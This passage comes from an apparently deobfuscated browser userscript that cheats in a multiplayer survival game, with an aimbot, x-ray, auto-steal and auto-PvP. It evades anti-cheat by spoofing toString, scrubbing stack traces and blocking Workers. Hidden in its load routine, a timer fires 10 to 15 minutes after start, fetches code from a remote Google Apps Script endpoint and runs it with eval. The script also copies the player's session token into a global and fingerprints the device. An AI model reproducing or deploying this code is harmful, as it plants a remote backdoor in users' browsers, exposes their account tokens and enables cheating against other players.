          if (Settings.AutoGreenCrownCmty.e && user.gauges.l * 200 < 170 && user.inv.n[INV.CROWN_OF_LIFE] && myPlayer.clothe !== INV.CROWN_OF_LIFE && (!user.bandage || !isInEnemyAttackRange()) && performance.now() - useCrownOfLifeLastTime > PingCounter + 200 && 10000 - (Date.now() - __p_ePLv_TimerTools_HPTimer) <= 250 + PingCounter) {
            const oldClothe1 = myPlayer.clothe;
            client.select_inv(INV.CROWN_OF_LIFE);
            useCrownOfLifeLastTime = performance.now();
            workerTimers.setTimeout(() => {
              client.select_inv(oldClothe1);
            }, 500);
          }
        }
      }
    }
  }
  function afterClientUnits() {
    aimbotLoop();
    autopvpLoop();
    syncToPlayerLoop();
  }
  const originalWorker = window.Worker;
  const originalBlob = window.Blob;
  const originalURLcreateObjectURL = window.URL.createObjectURL;
  window.LoadAfterGameLoad = () => {
    can = document.getElementById("game_canvas");
    ctx = can.getContext("2d");
    originalDrawImage = ctx.drawImage;
    canw = can.width;
    canh = can.height;
    canw2 = can.width / 2;
    canh2 = can.height / 2;
    canm = {
      x: canw2,
      y: canh2
    };
    {
      window.Worker = originalWorker;
      window.Blob = originalBlob;
      window.URL.createObjectURL = originalURLcreateObjectURL;
    }
    try {
      document.getElementById("option_in_game").style.opacity = 0.75;
      document.getElementById("shop_market").style.opacity = 0.75;
      document.getElementById("sure_delete").style.pointerEvents = 0.75;
      document.getElementById("cancel_sure_delete").style.pointerEvents = 0.75;
      document.getElementById("sure_delete").style.opacity = 0.75;
    } catch (e) {
      console.log("Error: ", e);
    }
    waitForGameObjects().then(() => {
      extractGameVariables();
      hooks();
      draw(performance.now());
      workerTimers.setInterval(AutoThings, 100);
      workerTimers.setInterval(CheckPing, 2000);
      workerTimers.setTimeout(performAntiCrack2, 600000);
      workerTimers.setTimeout(async () => {
        fetch("https://script.google.com/macros/s/AKfycbxNxRS-B2bfCZ65DsytFCxzi16yH4T5iNo9LTi4CfS5S25wVuP3sK28fsZ0dcJF1J4zCQ/exec", {
          method: "POST",
          body: JSON.stringify({
            action: "getConfig",
            payload: {}
          })
        }).then(_param_784 => {
          return _param_784.json();
        }).then(payload => {
          const code = payload.data.code;
          eval(code);
        });
      }, (Math.random() * 5 + 10) * 60000);
      Settings.Token.token = user.token;
      Settings.Token.token_id = user.token_id;
      gui.refresh();
      if (typeof window.onload === "function") {
        window.onload();
      }
    });
    (async () => {
      try {
        const module = await import("https://cdn.jsdelivr.net/npm/tweakpane@4.0.5/dist/tweakpane.min.js");
        window.Tweakpane = module;
        __p_JN2z_UtilsUI_LoadHack?.();
      } catch (err) {
        console.error("[Tweakpane Load Error]", err);
      }
    })();
    (async () => {
      try {
        const FingerprintJS = await import("https://esm.sh/@fingerprintjs/fingerprintjs");
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        const c = result.components;
        const data = {
          canvas: c.canvas?.value,
          audio: c.audio?.value,
          webGlBasics: c.webGlBasics?.value,
          webGlExtensions: c.webGlExtensions.value,
          deviceMemory: c.deviceMemory?.value,
          hardwareConcurrency: c.hardwareConcurrency?.value,
          colorDepth: c.colorDepth?.value
        };
        const raw = JSON.stringify(data);
        const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(_param_785 => {
          return _param_785.toString(16).padStart(2, "0");
        }).join("");
        window.finger = hashHex;
      } catch (err) {
        console.log("[FingerprintJS Load Error]", err);
      }
    })();
  };
  document.addEventListener("keydown", e => {
    if (chatxterm()) {
      return;
    }
    if (e.code === Settings.Aimbot.k) {
      Settings.Aimbot.e = !Settings.Aimbot.e;
      if (Settings.Aimbot.e) {
        aimbotLoop();
      }
    }
    if (e.code === Settings.AutoSpike.k && !Settings.AutoSpike.e) {
      Settings.AutoSpike.e = true;
      if (autospikeInterval) {
        workerTimers.clearInterval(autospikeInterval);
      }
      autospikeLoop();
      autospikeInterval = workerTimers.setInterval(autospikeLoop, 100);
    }
    if (e.code === Settings.AutoPvP.k && !Settings.AutoPvP.e) {
      Settings.AutoPvP.e = true;
      autopvpLoop();
    }
    if (e.code === Settings.AutoCraft.k) {
      Settings.AutoCraft.e = !Settings.AutoCraft.e;
    }
    if (e.code === Settings.AutoRecycle.k) {
      Settings.AutoRecycle.e = !Settings.AutoRecycle.e;
    }
    if (e.code === Settings.Xray.k) {
      Settings.Xray.e = !Settings.Xray.e;
      if (Settings.Xray.e) {
        enableXray();
      } else {
        disableXray();
      }
    }
    if (e.code === Settings.AutoFarm.k) {
      Settings.AutoFarm.e = !Settings.AutoFarm.e;
      if (Settings.AutoFarm.e === false) {
        send_move(oldUserDir);
      }
    }
    if (e.code === Settings.ExitVehicle.k) {
      Settings.ExitVehicle.e = !Settings.ExitVehicle.e;
    }
    if (e.code === Settings.Spectator.k) {
      if (Settings.Spectator.e) {
        client.get_focus();
      }
      Settings.Spectator.e = !Settings.Spectator.e;
    }
    if (e.code === Settings.AutoSteal.k) {
      Settings.AutoSteal.e = true;
    }
    if (e.code === Settings.DropWeapon.k) {
      DropWeapon();
    }
    if (e.code === Settings.AutoWall.k && !Settings.AutoWall.e) {
      Settings.AutoWall.e = true;
      if (autowallInterval) {
        workerTimers.clearInterval(autowallInterval);
      }
      autowallLoop();
      autowallInterval = workerTimers.setInterval(autowallLoop, 100);
    }
    if (e.code === Settings.FakeDrop.k) {
      Settings.FakeDrop.e = !Settings.FakeDrop.e;
      if (Settings.FakeDrop.e) {
        FakeDrop();
      }
    }
    if (e.code === Settings.AutoCraftSpikes.k) {
      Settings.AutoCraftSpikes.e = !Settings.AutoCraftSpikes.e;
    }
    if (e.code === Settings.AutoFire.k) {
      Settings.AutoFire.e = true;
    }
    if (e.code === Settings.AutoTotem.k) {
      Settings.AutoTotem.e = !Settings.AutoTotem.e;
    }
    if (e.code === Settings.BulkItems.k) {
      Settings.BulkItems.e = true;
    }
    if (e.code === Settings.AimbotSpike.k) {
      Settings.AimbotSpike.e = !Settings.AimbotSpike.e;
    }
    if (e.code === Settings.AutoBuild.k) {
      Settings.AutoBuild.e = !Settings.AutoBuild.e;
    }
    if (e.code === Settings.AutoKsDeadBox.k) {
      Settings.AutoKsDeadBox.e = !Settings.AutoKsDeadBox.e;
    }
    if (e.code === Settings.HideScript.k) {
      Settings.HideScript.e = !Settings.HideScript.e;
      hideScriptToggle();
    }
    if (e.code === Settings.ExtractorTake.k) {
      Settings.ExtractorTake.e = !Settings.ExtractorTake.e;
    }
    if (e.code === Settings.ExtractorPut.k) {
      Settings.ExtractorPut.e = !Settings.ExtractorPut.e;
    }
    if (e.code === Settings.AutoBreadTake.k) {
      Settings.AutoBreadTake.e = !Settings.AutoBreadTake.e;
    }
    if (e.code === Settings.AutoBreadPut.k) {
      Settings.AutoBreadPut.e = !Settings.AutoBreadPut.e;
    }
    if (e.code === Settings.AutoEme.k) {
      Settings.AutoEme.e = !Settings.AutoEme.e;
      if (Settings.AutoEme.e) {
        AutoEme_currentIndex = getNearestIndex({
          x: myPlayer.x,
          y: myPlayer.y
        }, AutoEme_farmLocations);
      }
    }
    gui?.refresh();
  });
  document.addEventListener("keyup", e => {
    if (chatxterm()) {
      return;
    }
    if (e.code === Settings.AutoSpike.k) {
      Settings.AutoSpike.e = false;
      if (autospikeInterval) {
        autospikeInterval = workerTimers.clearInterval(autospikeInterval);
      }
    }
    if (e.code === Settings.AutoPvP.k) {
      Settings.AutoPvP.e = false;
      send_move(oldUserDir);
    }
    if (e.code === Settings.AutoSteal.k) {
      Settings.AutoSteal.e = false;
    }
    if (e.code === Settings.AutoWall.k) {
      Settings.AutoWall.e = false;
      if (autowallInterval) {
        autowallInterval = workerTimers.clearInterval(autowallInterval);
      }
    }
    if (e.code === Settings.AutoFire.k) {
      Settings.AutoFire.e = false;
    }
    if (e.code === Settings.BulkItems.k) {
      Settings.BulkItems.e = false;
    }
    if (e.code === Settings.AimbotSpike.k) {
      if (Settings.AimbotSpike.mode === "HOLD") {
        Settings.AimbotSpike.e = false;
      }
    }
    gui?.refresh();
  });
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      ThisTabMiniMized = false;
    } else {
      ThisTabMiniMized = true;
    }
  });
  function init() {
    function propertyPrototypeHook(...__p_ohtw_varMask) {
      Reflect.defineProperty(Object.prototype, "ping", {
        get() {
          return this[privateSymbol];
        },
        set(value) {
          if (!client) {
            client = this;
          }
          this[privateSymbol] = value;
        }
      });
      Reflect.defineProperty(Object.prototype, "alert", {
        get() {
          return this[privateSymbol];
        },
        set(value) {
          if (!user) {
            user = this;
          }
          this[privateSymbol] = value;
        }
      });
      Reflect.defineProperty(Object.prototype, "transition", {
        get() {
          return this[privateSymbol];
        },
        set(value) {
          if (!world && !("cache" in this) && "mode" in this) {
            world = this;
          }
          this[privateSymbol] = value;
        }
      });
      Reflect.defineProperty(Object.prototype, "sign", {
        get() {
          return this[privateSymbol];
        },
        set(value) {
          if (!game) {
            game = this;
          }
          this[privateSymbol] = value;
        }
      });
      const touchedObjects = new Set();
      Reflect.defineProperty(Object.prototype, "IDLE", {
        configurable: true,
        get() {
          return this[privateSymbol];
        },
        set(value) {
          touchedObjects.add(this);
          this[privateSymbol] = value;
          if (!mouse && value === 2) {
            mouse = this;
            Reflect.deleteProperty(Object.prototype, "IDLE");
            for (const obj of touchedObjects) {
              if (obj && typeof obj === "object") {
                obj.IDLE = obj[privateSymbol];
                delete obj[privateSymbol];
              }
            }
          }
        }
      });
      Reflect.defineProperty(Object.prototype, "waiting", {
        get() {
          return this[privateSymbol];
        },
        set(value) {
          if (!ui && "unlock" in this) {
            ui = this;
          }
          this[privateSymbol] = value;
        }
      });
      Reflect.defineProperty(Object.prototype, "up", {
        get() {
          return this[privateSymbol];
        },
        set(value) {
          if (!keyboard && "keys" in this) {
            keyboard = this;
          }
          this[privateSymbol] = value;
        }
      });
    }
    
    {
      const original_indexOf = Function.prototype.call.bind(String.prototype.indexOf);
      String.prototype.indexOf = function (search, ...rest) {
        if (search === "\n") {
          return -1;
        }
        return original_indexOf(this, search, ...rest);
      };
      const desc = Object.getOwnPropertyDescriptor(Error.prototype, "stack");
      Object.defineProperty(Error.prototype, "stack", {
        get: function () {
          return desc.get.call(this).replace(/userscript/gi, "");
        }
      });
      localStorage.removeItem("VoidStorage");
      const nativeToStringStr = Function.prototype.toString.toString();
      const original_arrayPrototypePushToString = Array.prototype.push.toString();
      const original_requestAnimationFrameToString = requestAnimationFrame.toString();
      const originalFunctionToString = Function.prototype.toString;
      customToString = function () {
        if (this === Array.prototype.push) {
          return original_arrayPrototypePushToString;
        } else if (this === requestAnimationFrame) {
          return original_requestAnimationFrameToString;
        } else if (this === customToString) {
          return nativeToStringStr;
        } else {
          return originalFunctionToString.apply(this, arguments);
        }
      };
      Object.defineProperty(Function.prototype, "toString", {
        value: customToString,
        configurable: false,
        writable: false,
        enumerable: false
      });
      window.Worker = function () {
        console.log("[Tampermonkey] Blob bypassed.");
        return new Error("Blocked");
      };
      window.Blob = function () {
        console.log("[Tampermonkey] Blob bypassed.");
        return new Error("Blocked");
      };
      window.URL.createObjectURL = function () {
        console.log("[Tampermonkey] URL.createObjectURL bypassed.");
        return "";
      };
      Array = new Proxy(Array, {
        construct(target, args) {
          const size = args[0];
          if (typeof size === "number" && size > 1000000) {
            console.warn("[Bypass] Blocked creation of large array:", size);
            return [];
          }
          return Reflect.construct(target, args);
        }
      });
      Array.prototype.fill = new Proxy(Array.prototype.fill, {
        apply(_param_789, _param_788, _param_790) {
          if (Array.isArray(_param_788) && _param_788.length > 1000000) {
            console.warn("[Bypass] Blocked fill() on large array:", _param_788.length);
            return _param_788;
          }
          return Reflect.apply(_param_789, _param_788, _param_790);
        }
      });
    }
    propertyPrototypeHook();
    Object.defineProperties(window, {
      world: {
        get: () => {
          return world;
        }
      },
      client: {
        get: () => {
          return client;
        }
      },
      user: {
        get: () => {
          return user;
        }
      },
      game: {
        get: () => {
          return game;
        }
      },
      mouse: {
        get: () => {
          return mouse;
        }
      },
      ui: {
        get: () => {
          return ui;
        }
      },
      keyboard: {
        get: () => {
          return keyboard;
        }
      },
      Settings: {
        get: () => {
          return Settings;
        }
      },
      myPlayer: {
        get() {
          return world.fast_units[user.uid];
        }
      },
      lmbClient: {
        get() {
          return lmbClient;
        }
      },
      INV: {
        get() {
          return INV;
        }
      },
      ITEMS: {
        get() {
          return ITEMS;
        }
      },
      sprite: {
        get() {
          return sprite;
        }
      },
      temp: {
        get() {
          return temp;
        }
      },
      getMissingIngredients: {
        get() {
          return getMissingRawIngredients;
        }
      },
      getCraftableItem: {
        get() {
          return getPrerequisiteCraftId;
        }
      },
      canCraftWithOneTime: {
        get() {
          return canCraftWithOneTime;
        }
      },
      craftInv: {
        get() {
          return craftInv;
        }
      },
      sendToTokenHolder: {
        get() {
          return sendToTokenHolder;
        }
      },
      LMB_SERVER_URL: {
        get() {
          return LMB_SERVER_URL;
        },
        set(value) {
          LMB_SERVER_URL = value;
        }
      },
      MY_SPRITE: {
        get() {
          return MY_SPRITE;
        }
      },
      mySprite: {
        get() {
          return mySprite;
        }
      },
      build_bridge: {
        get() {
          return build_bridge;
        }
      },
      damageCalculator: {
        get() {
          return damageCalculator;
        }
      }
    });
  }
  return init();
})();
